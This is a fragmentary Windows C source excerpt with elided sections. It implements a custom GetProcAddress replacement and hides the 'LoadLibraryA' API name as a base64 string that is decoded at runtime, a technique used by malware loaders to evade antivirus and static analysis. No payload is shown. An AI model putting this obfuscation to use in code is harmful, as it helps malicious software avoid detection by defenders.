...
int FromBase64Crypto(const BYTE* pSrc, int nLenSrc, char* pDst, int nLenDst)
{
    ...
    BOOL fRet = CryptStringToBinaryA((char *)pSrc, nLenSrc, CRYPT_STRING_BASE64, (BYTE*)pDst, &nLenOut, NULL, NULL);
...
void convert_str(unsigned char* src_str, int src_len, char* dest_str, char* dest_2) {
	...
	int outsize3 = FromBase64Crypto(src_str, src_len, dest_str, src_len);
	dest_str[outsize3] = '\0';
	memcpy(dest_2, dest_str, outsize3 + 1);
...
FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* sProcName) {
	...
	if ((char*)pProcAddr >= (char*)pExportDirAddr &&
		...
		*sFwdFunction = 0;					// set trailing null byte for external library name -> library\x0function
		...
		unsigned char loadLib[20] = "TG9hZExpYnJhcnlB";
		char loadLib_clear[20];
		char loadlib_clear2[20];

		convert_str(loadLib, sizeof(loadLib), loadLib_clear, loadlib_clear2);

		// resolve LoadLibrary function pointer, keep it as global variable
		if (pLoadLibraryA == NULL) {
			pLoadLibraryA = (LoadLibrary_t)hlpGetProcAddress(hlpGetModuleHandle(L"KERNEL32.DLL"), loadLib_clear);
